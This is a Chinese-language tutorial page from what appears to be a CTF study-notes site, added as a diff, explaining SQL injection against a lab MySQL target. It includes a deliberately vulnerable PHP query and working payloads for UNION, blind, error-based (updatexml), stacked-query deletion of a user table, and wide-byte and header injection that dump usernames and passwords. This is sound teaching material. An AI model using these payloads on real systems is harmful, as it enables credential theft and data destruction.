@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN"  class="">
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="keywords" content="">
+    
+    
+    <meta name="description" content="">
+    
+    <meta name="generator" content="teedoc">
+    <meta name="theme" content="teedoc-plugin-theme-default">
+    
+        
+        <meta name="markdown-generator" content="teedoc-plugin-markdown-parser">
+        
+        <script>
+MathJax = {"loader": {"load": ["output/svg"]}, "tex": {"inlineMath": [["$", "$"], ["\\(", "\\)"]]}, "svg": {"fontCache": "global"}};
+</script>
+        
+        <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        
+        <script src="/static/js/theme_default/pre_main.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/prism.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/viewer.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/dark.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/light.css" type="text/css"/>
+        
+        <script src="/static/js/theme_default/jquery.min.js"></script>
+        
+        <script src="/static/js/theme_default/split.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/search/style.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/custom.css" type="text/css"/>
+        
+    
+    
+    <title>SQL注入漏洞 - H4ckVortex</title>
+    
+    <script type="text/javascript">js_vars = {}</script>
+    <script type="text/javascript">metadata = {"tags": [], "date": false, "update": [], "ts": 0, "author": "", "brief": "", "cover": ""}</script>
+</head>
+
+
+<body class="type_doc">
+    
+    <div id="navbar">
+        <div id="navbar_menu">
+            <a class="site_title" href="/">
+                
+                
+                    <h2>H4ckVortex</h2>
+                
+        </a>
+            <a id="navbar_menu_btn"></a>
+        </div>
+        <div id="navbar_items">
+            <div>
+                <ul id="nav_left">
+<li class=""><a  href="/arduino/">Arduino</a></li>
+<li class="active"><a  href="/web/">Web</a></li>
+<li class=""><a  href="/misc/">Misc</a></li>
+<li class=""><a  href="/forensics/">Forensics</a></li>
+<li class=""><a  href="/userscript/">UserScript</a></li>
+<li class=""><a  href="/other/">Other</a></li>
+</ul>
+
+            </div>
+            <div>
+                <ul id="nav_right">
+</ul>
+
+                <ul class="nav_plugins"><li><a id="themes" class="light"></a></li></ul><ul class="nav_plugins"><li><a id="search"><span class="icon"></span><span class="placeholder">搜索</span>
+                            <div id="search_hints">
+                                <span id="search_input_hint">输入关键词，多关键词空格隔开</span>
+                                <span id="search_loading_hint">正在加载，请稍候。。。</span>
+                                <span id="search_download_err_hint">下载文件失败，请刷新重试或检查网络</span>
+                                <span id="search_other_docs_result_hint">来自其它文档的结果</span>
+                                <span id="search_curr_doc_result_hint">当前文档搜索结果</span>
+                            </div></a></li></ul>
+            </div>
+        </div>
+    </div>
+    
+    <div id="wrapper">
+        <div id="sidebar_wrapper">
+            <div id="sidebar">
+                <div id="sidebar_title">
+                    
+                </div>
+                <ul class="show">
+<li class="not_active with_link"><a href="/web/CTF导航.html"><span class="label">CTF导航</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/Flask_PIN码伪造.html"><span class="label">Flask_PIN码伪造</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/Flask_session伪造.html"><span class="label">Flask_session伪造</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/2019-技能树-Web-布尔盲注/布尔盲注.html"><span class="label">布尔盲注</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/md5绕过汇总.html"><span class="label">md5绕过汇总</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/PHP小特性.html"><span class="label">PHP小特性</span><span class=""></span></a></li>
+<li class="active with_link"><a href="/web/SQL注入漏洞.html"><span class="label">SQL注入漏洞</span><span class=""></span></a></li>
+</ul>
+
+            </div>
+        </div>
+        <div id="article">
+            <div id="menu_wrapper">
+                <div id="menu">
+                </div>
+            </div>
+            <div id="content_wrapper">
+                <div id="content_body">
+                    <div id="article_head">
+                        <div id="article_title">
+                            
+                            <h1>SQL注入漏洞</h1>
+                            
+                        </div>
+                        <div id="article_tags">
+                            <ul>
+                            
+                            </ul>
+                        </div>
+                        <div id="article_info">
+                        <div id="article_info_left">
+                            <span class="article_author">
+                                
+                            </span>
+                            
+                        </div>
+                        <div id="article_info_right">
+                            
+                        </div>
+                        </div>
+                    </div>
+                    <div id="article_tools">
+                        <span></span>
+                        <span id="toc_btn"></span>
+                    </div>
+                    <div id="update_history">
+                        
+                    </div>
+                    <div id="article_content">
+                        
+                            <h2 id="%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">漏洞概述</h2>
+<p>Web 应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，对传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到 SQL 查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况，从而获取系统中的敏感信息，这种攻击被称为 SQL 注入攻击。这是现实场景下最常见的漏洞类型之一。</p>
+<h2 id="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</h2>
+<p>学习 SQL 注入漏洞需要你掌握一定的 SQL 基础，可以通过<a href="https://www.runoob.com/sql/sql-tutorial.html"  target="_blank">SQL 教程 | 菜鸟教程</a>自行学习。</p>
+<p>在此以 MySQL 数据库管理系统（常见的还有Microsoft SQL Server、SQLite等等）为例，简要地分析一下 SQL 注入漏洞。</p>
+
+<pre class="language-php"><code class="language-php">&lt;?php
+if(isset($_GET['id'])) {
+    $conn = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;db-test&quot;);
+    $sql = &quot;SELECT title,content FROM wp_news WHERE id=&quot; . $_GET['id'];
+    $res = mysqli_query($conn, $sql) or die(mysqli_error($conn));
+    $row = mysqli_fetch_array($res);
+    echo &quot;&lt;center&gt;&quot;;
+    echo &quot;&lt;h1&gt;&quot;.$row['title'].&quot;&lt;/h1&gt;&quot;;
+    echo &quot;&lt;br&gt;&quot;;
+    echo &quot;&lt;h1&gt;&quot;.$row['content'].&quot;&lt;/h1&gt;&quot;;
+    echo &quot;&lt;/center&gt;&quot;;
+} else { 
+    echo &quot;Please input the ID as parameter with numeric value&quot;;
+}
+?&gt;
+</code></pre>
+<p>这是一个简单的php代码，用于查询数据库中的内容。</p>
+
+<pre class="language-php"><code class="language-php">$sql = &quot;SELECT title,content FROM wp_news WHERE id=&quot; . $_GET['id'];
+</code></pre>
+<p>忽略一些无关紧要的代码段，让我们直接来看目标网站执行数据库查询操作的相关语句，很简单，是从 URL 中提取到参数 id 的值，然后拼接进入 SQL 语句，从数据表 wp_news 中查询出符合条件的记录。</p>
+<p><code>http://192.168.184.200/index.php?id=1</code><br />
+正常情况下，用户通过 URL 参数 id 提交常规的数据 1，则程序中拼接出的 SQL 语句为</p>
+
+<pre class="language-sql"><code class="language-sql">SELECT title,content FROM wp_news WHERE id=1
+</code></pre>
+<p>这是一条合法的 SQL 语句，访问数据库时应该可以查询到 id=1 的相关记录并回显。</p>
+<p>由于该 Web 应用并未对将要拼接的内容进行过滤，我们可以通过 URL 参数 id 提交一些内容拼接进 SQL 语句构成危险敏感的命令语句，查询出开发者意料之外的数据。</p>
+<h2 id="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</h2>
+<p><code>http://192.168.184.200/index.php?id=1'</code><br />
+我们可以通过 URL 参数 id 提交数据 <code>1'</code>，则程序中拼接出的 SQL 语句为</p>
+
+<pre class="language-sql"><code class="language-sql">SELECT title,content FROM wp_news WHERE id=1'
+</code></pre>
+<p>这是一条非法的 SQL 语句，前端页面也确实回显了相关错误提示。</p>
+
+<pre class="language-html"><code class="language-html">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+</code></pre>
+<p>通常情况下，可以使用这种方法来检查程序是否包含 SQL 注入漏洞。</p>
+<p>发现目标程序存有 SQL 注入漏洞后，需要判断具体的漏洞类型来进一步利用漏洞，其实也就是摸清其程序的后端代码是如何处理 SQL 语句的（上面直接分析后端代码是为了更好地理解漏洞，真实情况并不会知道后端代码）。</p>
+<p><code>http://192.168.184.200/index.php?id=2-1</code><br />
+通过 URL 参数 id 提交数据 <code>2-1</code>，则程序中拼接出的 SQL 语句为</p>
+
+<pre class="language-sql"><code class="language-sql">SELECT title,content FROM wp_news WHERE id=2-1
+</code></pre>
+<p>前端页面并没有报错，而是返回了 id=1 的相关记录。</p>
+<p>这也就说明了其程序后端做数据库处理的相关代码应该长这样</p>
+
+<pre class="language-php"><code class="language-php">$sql = &quot;SELECT title,content FROM wp_news WHERE id=&quot; . $_GET['id'];
+</code></pre>
+<p>这就是最为经典的数字型 SQL 注入漏洞。</p>
+<p>明确了漏洞的类型，我们就可以用相应的注入攻击方式来利用漏洞。</p>
+<h2 id="%E5%9F%BA%E4%BA%8EUNION%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5">基于UNION联合查询的注入</h2>
+<h3 id="%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5">数字型注入</h3>
+<p>继续前文的范例，我们来看看如何利用 UNION 注入攻击来应对数字型 SQL 注入漏洞。</p>
+<h4 id="%E5%88%A4%E6%96%AD%E8%A1%A8%E5%86%85%E5%AD%97%E6%AE%B5%E6%95%B0">判断表内字段数</h4>
+<p>可通过 order by n 的报错机制来判断表内字段数，出现报错时，n-1即为表内字段数。</p>
+<p>从 n=1 开始，不断的去试探。<br />
+<code>http://192.168.184.200/index.php?id=1 order by 1</code></p>
+<p>程序中拼接出的 SQL 语句为</p>
+
+<pre class="language-sql"><code class="language-sql">SELECT title,content FROM wp_news WHERE id=1 order by 1
+</code></pre>
+<p>回显正常。</p>
+<p><code>http://192.168.184.200/index.php?id=1 order by 2</code><br />
+回显正常。</p>
+<p>当 n=3 时，页面出现了报错，说明表内字段数应为2。</p>
+
+<pre class="language-html"><code class="language-html">Unknown column '3' in 'order clause'
+</code></pre>
+<p>除了使用 order by 的方法来判断表内字段数，还可以通过 union 的语法特点来判断。</p>
+<p><code>http://192.168.184.200/index.php?id=1 union select 0</code><br />
+页面报错，说明表内字段数并非为1。</p>
+
+<pre class="language-html"><code class="language-html">The used SELECT statements have a different number of columns
+</code></pre>
+<p><code>http://192.168.184.200/index.php?id=1 union select 0,0</code><br />
+回显正常，说明表内字段数为2。</p>
+<p>观察浏览器中的地址栏，你会发现你输入的内容被转化成了<br />
+<code>http://192.168.184.200/index.php?id=1%20union%20select%200,0</code><br />
+对比你之前输入的内容，其中的空格被转换成了<code>%20</code>，这是因为，在使用浏览器进行网页请求的时候，网址中的特殊字符会被按照 URL 规范进行编码，这就是 URLEncode 。</p>
+<h4 id="%E8%A7%82%E5%AF%9F%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%97%E6%AE%B5">观察回显的字段</h4>
+<p>成功判断出表内字段数后，就要观察哪些字段在页面有所回显。<br />
+还是用 union 语句来进行试探。<br />
+<code>id=-1 union select 1,2</code></p>
+<p>让 id=-1 是为了让 select 语句查询出的第一行数据为空，以便于回显出我们后面 union 拼接进去的内容，观察 1 和 2 在页面中回显的位置，记录下来即可。</p>
+<h4 id="%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D">获取库名</h4>
+<p><code>id=-1 union select 1,database()</code></p>
+<p>database() 是一个常见的 MySQL 函数，返回当前连接上正在打开的数据库名称。</p>
+<p>其他常见的函数还有：</p>
+<ul>
+<li>version()，返回当前 MySQL 服务器的版本。</li>
+<li>user()，返回当前连接的登录用户名。</li>
+</ul>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D">获取表名</h4>
+<p><code>id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p>
+<p>其中出现的 group_concat() 函数会将匹配到的结果连接成一个字符串进行输出，字符串中的每个结果默认用逗号作为分隔符。</p>
+<p>information_schema 是MySQL 中存在的一个内置的系统数据库，其中的 tables 表中存有系统中每一张数据表的相关信息，包括表名称、所属数据库等等，该表中的 table_schema 字段存储的值即为对应的数据表的所属数据库的名称。</p>
+<h4 id="%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D">获取字段名</h4>
+<p><code>id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='&lt;table_name&gt;'</code></p>
+<p>information_schema 中的 columns 表中存有每一个数据字段的信息，包括所属数据库名称、所属数据表名称、字段名称等等，该表中的 table_name 字段存储的值即为对应的数据字段的所属数据表的名称。</p>
+<p>后续则是获取详细数据内容的操作。</p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8wp_user%E4%B8%ADid%3D1%E7%9A%84%E6%95%B0%E6%8D%AE">获取表wp_user中id=1的数据</h4>
+<p><code>id=-1 union select user,pwd from wp_user where id=1</code></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8wp_user%E4%B8%AD%E5%AD%97%E6%AE%B5%E4%B8%BAuser%E5%92%8Cpwd%E7%9A%84%E4%BF%A1%E6%81%AF">获取表wp_user中字段为user和pwd的信息</h4>
+<p><code>id=-1 union select group_concat(user),group_concat(pwd) from wp_user</code></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8wp_user%E4%B8%ADuser%E5%AD%97%E6%AE%B5%E5%80%BC%E4%B8%BA%27admin%27%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%AD%97%E6%AE%B5id%E5%92%8Cpwd%E7%9A%84%E5%80%BC">获取表wp_user中user字段值为'admin'的数据中字段id和pwd的值</h4>
+<p><code>id=-1 union select id,pwd from wp_user where user='admin'</code></p>
+<h4 id="schemata%E8%A1%A8">schemata表</h4>
+<p>获取所有数据库库名<br />
+<code>-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></p>
+<p>前面通过 database() 函数获取了库名，也可以通过查表方法获取所有数据库库名。</p>
+<p>information_schema 中的 schemata 表中存有所有数据库的名称和字符集等信息，该表中的 schema_name 字段存储的值即为所有数据库的名称。</p>
+<h4 id="%E5%B7%A7%E7%94%A8limit">巧用limit</h4>
+<p>查询数据库db-test的第一个表名<br />
+<code>-1 union select 1,(select table_name from information_schema.tables where table_schema='db-test' limit 0,1)</code></p>
+<p>可以不使用 group_concat() 函数，改使用 limit 来限制输出列数，确保 union 语句的语法正确，得到正确的输出。</p>
+<h3 id="%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">字符型注入</h3>
+<p>前文学习了如何利用 UNION 注入攻击来应对数字型 SQL 注入漏洞，其实应对字符型 SQL 注入漏洞的操作大同小异。</p>
+<p><code>http://192.168.184.200/index.php?id=1'</code><br />
+首先是判断是否存在 SQL 注入漏洞，目标页面产生了相应的错误回显，说明存在 SQL 注入漏洞。</p>
+
+<pre class="language-html"><code class="language-html">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
+</code></pre>
+<p><code>http://192.168.184.200/index.php?id=2-1</code><br />
+再判断存在何种 SQL 注入漏洞，浏览该页面后发现回显的结果和 id=2 时相同，并非返回 id=1 的相关记录，这说明后端的 SQL 语句在处理时将 2-1 这个参数识别成 2 了，其后端真实语句如下</p>
+
+<pre class="language-php"><code class="language-php">$sql = &quot;SELECT title,content FROM wp_news WHERE id='&quot; . $_GET['id'] . &quot;'&quot;;
+</code></pre>
+<p>与数字型 SQL 注入漏洞相比，从 url 中获取的参数 id 多了一对单引号的包裹，传入的 id 值将被作为字符串，再经过强制类型转换为数字后拼接进入 sql 查询语句。</p>
+<p><code>http://192.168.184.200/index.php?id=1'#</code><br />
+我们可以尝试访问如上 url 来验证后端的处理语句，拼接完成后应该成为如下的语句形式。</p>
+
+<pre class="language-sql"><code class="language-sql">SELECT title,content FROM wp_news WHERE id='1'#'
+</code></pre>
+<p>数字后面的单引号对前面预设的单引号做了闭合操作，紧接后面的注释符注释了后面多余的单引号，不过当你尝试做这一步操作的时候，可能会发现浏览器并未返回出正确的页面，这还是因为 URL 编码的问题，需要我们手动进行编码再将 URL 输入到地址栏中进行访问。<br />
+<code>http://192.168.184.200/index.php?id=1%27%23</code></p>
+<p>那接下来的注入攻击流程便和应对数字型 SQL 注入漏洞一致了，将应对数字型 SQL 注入漏洞的注入部分添加到 %27 和 %23 之间即可。</p>
+<p>获取所有数据库库名</p>
+
+<pre class="language-none"><code class="language-none">http://192.168.184.200/index.php?id=-1%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27db-test%27%23
+</code></pre>
+<p>其他操作不再赘述。</p>
+<h2 id="%E7%9B%B2%E6%B3%A8">盲注</h2>
+<h3 id="%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</h3>
+<p>见笔记文件另一文件夹<br />
+(点击跳转 &gt;&gt;&gt;)[]</p>
+<h3 id="%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</h3>
+<p>id=1' and if(length(database())&gt;1,1,sleep(3))--+</p>
+<h2 id="%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</h2>
+<p>由于函数 updatexml() 的第二个参数需要 Xpath 格式的字符串，而这里第二个参数是 concat()函数，该函数此时的返回值是以~开头的字符串，这不是 xml 格式的语法，所以函数 updatexml()执行时会报错，而且会把 concat()函数的执行结果以错误的形式报出。通过这种方式，就可以在这里注入 SQL 语句，并通过出错信息获知其执行结果，把这种注入攻击的方法称之为报错注入。</p>
+<p>注意，函数执行出错时，返回的报错信息最长是 32 位，如果第二个参数很长，超过32位，报错信息只返回前 32 位。</p>
+<p>报错信息无法查看到所有所需信息时，可用 left() 或者 right() 等函数输出其余部分信息，例如：<br />
+<code>1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23</code></p>
+<h3 id="%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D">获取库名</h3>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, (select database()), 0x7e), 1)%23</p>
+<p>当空格被过滤时，可以替换成，下同<br />
+<code>1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</code></p>
+<h3 id="%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D">获取表名</h3>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='db-test'), 0x7e), 1)%23</p>
+<h3 id="%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D">获取字段名</h3>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='wp_user'), 0x7e), 1)%23</p>
+<h3 id="%E8%8E%B7%E5%8F%96user%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE">获取user字段数据</h3>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(user) from wp_user), 0x7e), 1)%23</p>
+<h3 id="%E8%8E%B7%E5%8F%96pwd%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE">获取pwd字段数据</h3>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(pwd) from wp_user), 0x7e), 1)%23</p>
+<h3 id="%E6%88%AA%E6%96%AD%E8%BE%93%E5%87%BA">截断输出</h3>
+<p>这里我提前在数据库中替换了pwd字段的数据，可以发现该数据长度太长，不能完全在报错信息中展示</p>
+<p>此时我们可以使用mid()函数截断数据进行输出</p>
+<p>1' OR UPDATEXML(1, CONCAT(0x7e, mid((select group_concat(pwd) from wp_user),1,16), 0x7e), 1)%23<br />
+1' OR UPDATEXML(1, CONCAT(0x7e, mid((select group_concat(pwd) from wp_user),17), 0x7e), 1)%23</p>
+<p>也可使用extractvalue()函数代替UPDATEXML()函数</p>
+<h2 id="%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%B3%A8%E5%85%A5">多语句注入</h2>
+<p>注入该语句，将当前库中wp_user表的信息清空了<br />
+-1';delete from wp_user%23</p>
+<p>获取当前数据库库名<br />
+?id=-1'; select 0,database()%23</p>
+<h2 id="%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</h2>
+<p>在注册时注入包含sql语句的非法用户名，再通过其余页面访问该用户从而变相执行语句</p>
+<h2 id="%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</h2>
+<p>对比数字型，只需在附加部分用 %df%27 &lt;数字型注入部分&gt; %23 包裹即可</p>
+<p>payload中包裹users的引号对也会被转义导致语法错误，如果不使用引号对讲导致未知列错误。</p>
+<p>将字符串转换成16进制即可不使用引号对从而避免这些问题。</p>
+<h2 id="%E5%85%B6%E4%BD%99%E6%B3%A8%E5%85%A5">其余注入</h2>
+<p>上面的方法都是属于get注入，还有属于post注入的类型，那么下面的都是在request包中的注入</p>
+<p>cookie注入<br />
+在cookie信息中附加sql语句即可</p>
+<p>UA注入<br />
+User-Agent</p>
+<p>Refer注入<br />
+Referer</p>
+<p>xff注入<br />
+X-Forwarded-For<br />
+在X-Forwarded-For信息中附加sql语句即可</p>
+
+<pre class="language-none"><code class="language-none">绕过空格过滤的方式： /**/、()、%0a。
+</code></pre>
+<p><a href="https://www.freebuf.com/articles/web/404072.html"  target="_blank">从0到1，SQL注入（sql十大注入类型）收藏这一篇就够了，技术解析与实战演练 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://blog.csdn.net/Genevieve_xiao/article/details/119487157"  target="_blank">SQL注入（一）—— sql手动注入实操_sql注入手动注入方法-CSDN博客</a></p>
+<p>判断注入点</p>
+<p>判断字段数</p>
+<p>观察回显字段</p>
+<h2 id="sqlmap">sqlmap</h2>
+<h2 id=""></h2>
+
+                        
+                    </div>
+                </div>
+                <div id="previous_next">
+                    <div id="previous">
+                        
+                        <a href="/web/PHP小特性.html">
+                            <span class="icon"></span>
+                            <span class="label">PHP小特性</span>
+                        </a>
+                        
+                    </div>
+                    <div id="next">
+                        
+                    </div>
+                </div>
+                <div id="comments-container"></div>
+            </div>
+            <div id="toc_wrapper">
+                <div id="toc">
+                    <div id="toc_content">
+                            
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <a id="to_top" href="#"></a>
+    <div id="doc_footer">
+        <div id="footer">
+            <div id="footer_top">
+                <ul>
+<li><a></a><ul><li><a target="_blank" href="/#"></a></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+            <div id="footer_bottom">
+                <ul>
+<li><a target="_blank" href="https://github.com/teedoc/teedoc">Generated by teedoc</a></li>
+</ul>
+
+            </div>
+        </div>
+    </div>
+    
+        <script src="/teedoc-plugin-markdown-parser/mermaid.min.js"></script>
+    
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    
+        <script src="/static/js/theme_default/tocbot.min.js"></script>
+    
+        <script src="/static/js/theme_default/main.js"></script>
+    
+        <script src="/static/js/theme_default/viewer.min.js"></script>
+    
+        <script src="/static/css/theme_default/prism.min.js"></script>
+    
+        <script src="/static/js/search/search_main.js"></script>
+    
+        <script src="/static/js/custom.js"></script>
+    
+        <script type="text/javascript" src="/static/js/live.js"></script>
+    
+</body>
+
+</html>
